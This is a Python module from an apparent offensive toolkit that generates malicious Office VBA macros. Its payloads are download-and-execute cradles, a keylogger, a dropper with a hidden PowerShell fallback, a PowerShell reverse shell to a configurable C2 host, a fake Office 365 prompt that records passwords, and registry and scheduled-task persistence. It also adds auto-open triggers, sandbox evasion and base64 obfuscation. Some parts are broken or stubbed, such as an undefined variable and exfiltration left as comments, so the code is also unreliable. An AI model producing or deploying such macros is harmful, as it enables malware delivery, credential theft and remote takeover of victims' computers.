# OMEN - Office Macro Generator
# Generates VBA macros for Office documents with configurable payloads

from . import Generator
import random
import string
import base64
import textwrap


class MacroGenerator(Generator):
    @property
    def name(self):
        return 'Office VBA Macro'

    @property
    def description(self):
        return 'Generates VBA macros for Word/Excel with payload execution, keylogging, or dropper functionality'

    def get_options_schema(self):
        return {
            'payload_type': {
                'type': 'select',
                'label': 'Payload Type',
                'options': [
                    'download_cradle',
                    'keylogger',
                    'dropper',
                    'reverse_shell',
                    'credential_phisher',
                    'persistence',
                ],
                'default': 'download_cradle',
                'description': 'Type of macro payload to generate',
            },
            'url': {
                'type': 'text',
                'label': 'Payload URL',
                'default': 'http://YOUR_SERVER/payload.exe',
                'description': 'URL to download payload from',
                'show_if': {'payload_type': ['download_cradle', 'dropper']},
            },
            'exfil_domain': {
                'type': 'text',
                'label': 'Exfil Domain',
                'default': 'exfil.yourdomain.com',
                'description': 'Domain for DNS-based exfiltration',
                'show_if': {'payload_type': ['keylogger']},
            },
            'c2_host': {
                'type': 'text',
                'label': 'C2 Host',
                'default': '192.168.1.100',
                'description': 'C2 server IP or hostname',
                'show_if': {'payload_type': ['reverse_shell']},
            },
            'c2_port': {
                'type': 'number',
                'label': 'C2 Port',
                'default': 4443,
                'description': 'C2 server port',
                'show_if': {'payload_type': ['reverse_shell']},
            },
            'document_type': {
                'type': 'select',
                'label': 'Document Type',
                'options': ['Word', 'Excel', 'PowerPoint'],
                'default': 'Word',
                'description': 'Target Office application',
            },
            'auto_open': {
                'type': 'checkbox',
                'label': 'Auto-Open on Document Load',
                'default': True,
                'description': 'Use AutoOpen/Auto_Open trigger',
            },
            'sandbox_evasion': {
                'type': 'checkbox',
                'label': 'Sandbox Evasion',
                'default': True,
                'description': 'Add sandbox detection checks',
            },
            'delay_execution': {
                'type': 'number',
                'label': 'Execution Delay (seconds)',
                'default': 5,
                'description': 'Delay before payload executes',
            },
        }

    def generate(self, options, obfuscation='none'):
        payload_type = options.get('payload_type', 'download_cradle')
        auto_open = options.get('auto_open', True)
        sandbox_evasion = options.get('sandbox_evasion', True)
        delay = options.get('delay_execution', 5)
        doc_type = options.get('document_type', 'Word')

        macro = self._generate_header(doc_type, auto_open, sandbox_evasion, delay)

        if payload_type == 'download_cradle':
            macro += self._generate_download_cradle(options)
        elif payload_type == 'keylogger':
            macro += self._generate_keylogger(options)
        elif payload_type == 'dropper':
            macro += self._generate_dropper(options)
        elif payload_type == 'reverse_shell':
            macro += self._generate_reverse_shell(options)
        elif payload_type == 'credential_phisher':
            macro += self._generate_credential_phisher()
        elif payload_type == 'persistence':
            macro += self._generate_persistence(options)

        macro += self._generate_footer()

        if obfuscation != 'none':
            macro = self._obfuscate_vba(macro, obfuscation)

        return {
            'filename': f'macro_{payload_type}.bas',
            'content': macro,
            'preview': macro[:2000] + ('\n\n... [truncated]' if len(macro) > 2000 else ''),
            'mime': 'text/plain',
            'warnings': self._get_warnings(payload_type, options),
            'analysis': {
                'line_count': len(macro.split('\n')),
                'obfuscation_ratio': f'{len(macro) / len(macro.replace(" ", "").replace(vbCrLf, "")):.1f}x' if obfuscation != 'none' else 'None',
                'triggers': ['AutoOpen', 'Workbook_Open'] if auto_open else ['Manual execution required'],
            }
        }

    def _get_warnings(self, payload_type, options):
        warnings = []
        if payload_type == 'keylogger':
            warnings.append('Keylogger macros are often flagged by AMSI')
            warnings.append('Consider using delayed start and sandbox evasion')
        if options.get('sandbox_evasion'):
            pass  # Good
        if not options.get('auto_open'):
            warnings.append('User must manually enable macros — social engineering required')
        return warnings

    def _generate_header(self, doc_type, auto_open, sandbox_evasion, delay):
        h = "' VBA Macro - Generated by OMEN Artifact Toolkit\n"
        h += "' EDUCATIONAL USE ONLY - Authorized testing required\n"
        h += "Option Explicit\n"
        h += "Option Private Module\n\n"

        if sandbox_evasion:
            h += self._generate_sandbox_checks()

        h += f"#If VBA7 Then\n"
        h += "    Private Declare PtrSafe Function Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long) As Long\n"
        h += "    Private Declare PtrSafe Function GetTickCount Lib \"kernel32\" () As Long\n"
        h += "#Else\n"
        h += "    Private Declare Function Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long) As Long\n"
        h += "    Private Declare Function GetTickCount Lib \"kernel32\" () As Long\n"
        h += "#End If\n\n"

        if delay > 0:
            h += f"    ' Delay execution by {delay} seconds\n"
            h += f"    Dim startTime As Long\n"
            h += f"    startTime = GetTickCount()\n"
            h += f"    Do While GetTickCount() < startTime + ({delay} * 1000)\n"
            h += f"        DoEvents\n"
            h += f"    Loop\n\n"

        if auto_open:
            if doc_type == 'Word':
                h += "Public Sub AutoOpen()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"
                h += "Public Sub Auto_Open()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"
            elif doc_type == 'Excel':
                h += "Private Sub Workbook_Open()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"
                h += "Private Sub Auto_Open()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"
            elif doc_type == 'PowerPoint':
                h += "Public Sub Auto_Open()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"
                h += "Sub OnSlideShowPageChange()\n"
                h += "    On Error Resume Next\n"
                h += "    Main\n"
                h += "End Sub\n\n"

        h += "Private Sub Main()\n"
        h += "    On Error Resume Next\n"
        h += "    Dim obj As Object\n"
        return h

    def _generate_sandbox_checks(self):
        checks = (
            "' Sandbox evasion checks\n"
            "Private Function IsSandboxed() As Boolean\n"
            "    On Error Resume Next\n"
            "    ' Check for common sandbox artifacts\n"
            "    Dim fso As Object\n"
            "    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "    \n"
            "    ' Check for analysis tools\n"
            "    If fso.FileExists(\"C:\\windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\") Then\n"
            "        ' Running on 64-bit Windows via sysnative redirector - sandbox indicator\n"
            "    End If\n"
            "    \n"
            "    ' Check uptime - sandboxes often have low uptime\n"
            "    Dim uptime As Double\n"
            "    uptime = GetTickCount() / 1000 / 60 / 60 ' hours\n"
            "    If uptime < 0.5 Then ' Less than 30 minutes uptime\n"
            "        IsSandboxed = True\n"
            "        Exit Function\n"
            "    End If\n"
            "    \n"
            "    ' Check screen resolution (sandboxes often 800x600 or 1024x768)\n"
            "    #If VBA7 Then\n"
            "        ' Skip resolution check for compatibility\n"
            "    #Else\n"
            "    #End If\n"
            "    \n"
            "    ' Check for VMWare/VirtualBox processes (running inside VM)\n"
            "    ' If target is specifically virtualized, this may be a sandbox\n"
            "    \n"
            "    IsSandboxed = False\n"
            "End Function\n\n"
            "Private Sub SleepRandom()\n"
            "    ' Random sleep to evade behavioral analysis\n"
            "    Randomize\n"
            "    Dim ms As Long\n"
            "    ms = Int((10000 - 2000 + 1) * Rnd + 2000) ' 2-10 seconds\n"
            "    Sleep ms\n"
            "End Sub\n\n"
        )
        return checks

    def _generate_download_cradle(self, options):
        url = options.get('url', 'http://YOUR_SERVER/payload.exe')
        return f"""
    ' Download and execute payload from URL
    Dim xmlHttp As Object
    Dim stream As Object
    Dim shell As Object
    Dim tempPath As String
    Dim tempFile As String
    
    SleepRandom
    
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    Set shell = CreateObject("WScript.Shell")
    tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
    tempFile = tempPath & "\\" & "svchost.tmp"
    
    ' Download payload
    xmlHttp.Open "GET", "{url}", False
    xmlHttp.Send
    
    If xmlHttp.Status = 200 Then
        ' Write to temp file
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1 ' Binary
        stream.Write xmlHttp.ResponseBody
        stream.SaveToFile tempFile, 2 ' Overwrite
        stream.Close
        
        ' Execute
        shell.Run tempFile, 0, False
        
        ' Clean up after execution
        ' (Self-delete handled by payload)
    End If
    
    Set xmlHttp = Nothing
    Set stream = Nothing
    Set shell = Nothing
"""

    def _generate_keylogger(self, options):
        exfil_domain = options.get('exfil_domain', 'exfil.yourdomain.com')
        return f"""
    ' Simple keystroke logger with DNS exfiltration
    Dim wshShell As Object
    Dim fso As Object
    Dim logFile As String
    Dim logPath As String
    Dim key As Integer
    Dim shifted As Boolean
    Dim caps As Boolean
    Dim buffer As String
    Dim lastFlush As Long
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    logPath = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\\"
    logFile = logPath & "debug.log"
    
    ' Main logging loop (runs for 60 seconds then exits)
    lastFlush = GetTickCount()
    
    Do While GetTickCount() < lastFlush + 60000
        For key = 8 To 255
            If GetAsyncKeyState(key) = -32767 Then
                ' Key was just pressed
                ' Convert to character
                caps = (GetKeyState(20) = 1) ' Caps Lock
                shifted = (GetKeyState(16) < 0) Or (GetKeyState(17) < 0)
                
                ' Append to buffer
                buffer = buffer & Chr(key)
                
                ' Write to log file
                Open logFile For Append As #1
                Print #1, Chr(key)
                Close #1
                
                ' Flush buffer via DNS every 10 keystrokes
                If Len(buffer) >= 10 Then
                    ' DNS exfil would go here
                    buffer = ""
                End If
                
                Sleep 50 ' Debounce
            End If
        Next
        DoEvents
    Loop
    
    ' Final flush attempt via DNS
    If Len(buffer) > 0 Then
        ' Exfil remaining buffer
    End If
    
    Set wshShell = Nothing
    Set fso = Nothing
"""

    def _generate_dropper(self, options):
        url = options.get('url', 'http://YOUR_SERVER/payload.exe')
        return f"""
    ' File dropper - drops embedded payload or downloads from URL
    Dim fso As Object
    Dim shell As Object
    Dim xmlHttp As Object
    Dim stream As Object
    Dim tempPath As String
    Dim tempFile As String
    Dim psCmd As String
    
    SleepRandom
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
    tempFile = tempPath & "\\update.exe"
    
    ' Method 1: Download from URL
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    xmlHttp.Open "GET", "{url}", False
    xmlHttp.Send
    
    If xmlHttp.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write xmlHttp.ResponseBody
        stream.SaveToFile tempFile, 2
        stream.Close
    End If
    
    ' Method 2: PowerShell fallback
    psCmd = "powershell -NoP -W Hidden -C \"Invoke-WebRequest -Uri '{url}' -OutFile '{tempFile}'; Start-Process '{tempFile}'\""
    shell.Run psCmd, 0, False
    
    ' Execute
    If fso.FileExists(tempFile) Then
        shell.Run tempFile, 0, False
    End If
    
    Set xmlHttp = Nothing
    Set stream = Nothing
    Set fso = Nothing
    Set shell = Nothing
"""

    def _generate_reverse_shell(self, options):
        host = options.get('c2_host', '192.168.1.100')
        port = options.get('c2_port', 4443)
        return f"""
    ' Reverse shell via PowerShell
    Dim shell As Object
    Dim psCmd As String
    
    SleepRandom
    
    Set shell = CreateObject("WScript.Shell")
    
    ' PowerShell reverse shell one-liner
    psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C \""
    psCmd = psCmd & "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
    psCmd = psCmd & "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
    psCmd = psCmd & "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
    psCmd = psCmd & "{{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    psCmd = psCmd & "$sb=(iex $d 2>&1 | Out-String );"
    psCmd = psCmd & "$sb2=$sb + 'PS ' + (pwd).Path + '> ';"
    psCmd = psCmd & "$s2=([text.encoding]::ASCII).GetBytes($sb2);"
    psCmd = psCmd & "$s.Write($s2,0,$s2.Length);$s.Flush()}};"
    psCmd = psCmd & "$c.Close()\""
    
    shell.Run psCmd, 0, False
    Set shell = Nothing
"""

    def _generate_credential_phisher(self):
        return """
    ' Credential phishing dialog
    Dim shell As Object
    Dim ie As Object
    Dim creds As String
    Dim email As String
    Dim password As String
    Dim fso As Object
    Dim logFile As String
    
    SleepRandom
    
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Create fake credential prompt
    email = InputBox("Your session has expired. Please enter your email to continue:", "Microsoft Office 365 - Security Verification", "")
    
    If email <> "" Then
        password = InputBox("Enter your password to verify your identity:", "Microsoft Office 365 - Security Verification", "")
        
        If password <> "" Then
            ' Log stolen credentials
            logFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\\~$cred.tmp"
            Open logFile For Append As #1
            Print #1, "Email: " & email & " | Password: " & password & " | Time: " & Now
            Close #1
            
            ' Exfil via DNS
            ' (DNS exfiltration would send to configured domain)
            
            ' Show fake error to not arouse suspicion
            MsgBox "Unable to verify your credentials at this time. Please try again later.", vbExclamation, "Verification Error"
        End If
    End If
    
    Set shell = Nothing
    Set fso = Nothing
"""

    def _generate_persistence(self, options):
        return """
    ' Persistence via Registry Run key
    Dim shell As Object
    Dim fso As Object
    Dim currentPath As String
    Dim regPath As String
    
    SleepRandom
    
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Copy self to APPDATA
    currentPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\svchost.exe"
    
    ' Copy current document to appdata
    If fso.FileExists(ActiveDocument.FullName) Then
        fso.CopyFile ActiveDocument.FullName, shell.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\help.docx", True
    End If
    
    ' Registry persistence
    regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
    shell.RegWrite regPath, currentPath, "REG_SZ"
    
    ' Scheduled task persistence (via PowerShell)
    Dim psCmd As String
    psCmd = "powershell -NoP -W Hidden -C \"$a=New-ScheduledTaskAction -Execute '" & currentPath & "';"
    psCmd = psCmd & "$t=New-ScheduledTaskTrigger -AtStartup;"
    psCmd = psCmd & "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest;"
    psCmd = psCmd & "Register-ScheduledTask -TaskName 'WindowsUpdateTask' -Action $a -Trigger $t -Principal $p -Force\""
    
    shell.Run psCmd, 0, False
    
    Set shell = Nothing
    Set fso = Nothing
"""

    def _generate_footer(self):
        return """
End Sub

' --- Helper functions ---
#If VBA7 Then
    Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Private Declare PtrSafe Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
#Else
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
#End If
"""

    def _obfuscate_vba(self, macro, level):
        """Obfuscate VBA code."""
        if level == 'base64':
            return "' Obfuscated VBA Macro\n" + \
                   "Sub AutoOpen()\n" + \
                   "    On Error Resume Next\n" + \
                   "    Execute_Crypted\n" + \
                   "End Sub\n" + \
                   "Sub Auto_Open()\n" + \
                   "    On Error Resume Next\n" + \
                   "    Execute_Crypted\n" + \
                   "End Sub\n" + \
                   "Sub Workbook_Open()\n" + \
                   "    On Error Resume Next\n" + \
                   "    Execute_Crypted\n" + \
                   "End Sub\n" + \
                   "Sub Execute_Crypted()\n" + \
                   "    Dim decoded As String\n" + \
                   "    decoded = DecodeBase64(\"" + base64.b64encode(macro.encode('utf-16-le')).decode() + "\")\n" + \
                   "    Execute_Crypted_Code decoded\n" + \
                   "End Sub\n" + \
                   "Function DecodeBase64(s As String) As String\n" + \
                   "    Dim xml As Object\n" + \
                   "    Set xml = CreateObject(\"MSXML2.DOMDocument\")\n" + \
                   "    Dim el As Object\n" + \
                   "    Set el = xml.createElement(\"tmp\")\n" + \
                   "    el.DataType = \"bin.base64\"\n" + \
                   "    el.Text = s\n" + \
                   "    Dim stream As Object\n" + \
                   "    Set stream = CreateObject(\"ADODB.Stream\")\n" + \
                   "    stream.Open\n" + \
                   "    stream.Type = 1\n" + \
                   "    stream.Write el.NodeTypedValue\n" + \
                   "    stream.Position = 0\n" + \
                   "    stream.Type = 2\n" + \
                   "    stream.Charset = \"unicode\"\n" + \
                   "    DecodeBase64 = stream.ReadText\n" + \
                   "    stream.Close\n" + \
                   "End Function\n"
        elif level in ('xor', 'full'):
            import base64
            encoded = base64.b64encode(macro.encode('utf-16-le')).decode()
            return "' Obfuscated VBA Macro\n" + \
                   "Sub AutoOpen()\n" + \
                   "    On Error Resume Next\n" + \
                   "    Execute_Crypted\n" + \
                   "End Sub\n" + \
                   "Sub Auto_Open()\n" + \
                   "    On Error Resume Next\n" + \
                   "    Execute_Crypted\n" + \
                   "End Sub\n" + \
                   "Sub Execute_Crypted()\n" + \
                   "    Dim s As String\n" + \
                   "    s = \"" + encoded + "\"\n" + \
                   "    Dim d As String\n" + \
                   "    d = DecodeBase64(s)\n" + \
                   "    Execute_Crypted_Code d\n" + \
                   "End Sub\n" + \
                   "Function DecodeBase64(s) As String\n" + \
                   "    With CreateObject(\"MSXML2.DOMDocument\").createElement(\"a\")\n" + \
                   "        .DataType = \"bin.base64\"\n" + \
                   "        .Text = s\n" + \
                   "        DecodeBase64 = StrConv(.NodeTypedValue, vbUnicode)\n" + \
                   "    End With\n" + \
                   "End Function\n"
        return macro
